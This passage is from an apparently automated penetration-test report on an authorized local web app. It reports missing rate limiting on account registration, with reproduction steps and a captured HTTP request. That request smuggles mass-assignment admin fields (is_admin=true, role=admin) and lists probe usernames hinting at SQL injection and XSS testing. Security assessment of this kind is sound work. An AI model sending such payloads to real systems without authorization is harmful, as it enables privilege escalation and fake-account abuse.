    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
<div class="register-link">
    <p>Don't have an account? <a href="/register">Register here</a></p>
</div>

    </main>
</body>
</html>
```

<a id="finding-6"></a>

### 6. [SUSPECTED] [LOW] [rate-limit] No rate limiting on account registration (/register)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

**Anomaly (why this is a lead):** ≥6 account registrations submitted to POST /register within seconds, each returning HTTP 302 success with no 429/CAPTCHA/throttle/lockout — account creation is entirely unthrottled. Recorded as suspected because the missing-control nature yields only mutually-indistinguishable successes, which cannot form the confirmed negativeControl-fails + positive-replays evidence structure.

POST /register enforces no rate limiting, CAPTCHA, or throttling on account creation. During this assessment ≥6 distinct accounts (verdict_base1, verdict_xss1, verdict_xss2, verdictsql1', verdict_ma1, plus the baseline) were created via rapid back-to-back POSTs within a few seconds; every request returned HTTP 302 "Registration successful" with no 429, no CAPTCHA challenge, no delay, and no lockout. This permits automated mass/fake-account creation, registration spam, and resource exhaustion. Note: the same missing-control class is already confirmed on /login (password brute-force), indicating an app-wide absence of rate limiting.

**Reproduction**

```
1. POST /register with a unique username and valid fields → 302 redirect to /login ("Registration successful"). 2. Immediately repeat with different usernames 5+ times in succession. 3. Observe every request succeeds (302) with no 429/CAPTCHA/delay/lockout. Evidence: rapid successful registrations ev-mr0jktzh-x, ev-mr0jkvek-y, ev-mr0js20a-1c, ev-mr0js3f4-1d.
```

**Evidence**

- Evidence `ev-mr0js3f4-1d` — `artifacts/s-0002/ev-mr0js3f4-1d/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_ma1&password=Passw0rd!23&first_name=Mass&last_name=Assign&email=ma1@example.com&is_admin=true&role=admin&is_staff=true&admin=true
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 199
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:12:36 GMT
location: /login
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```
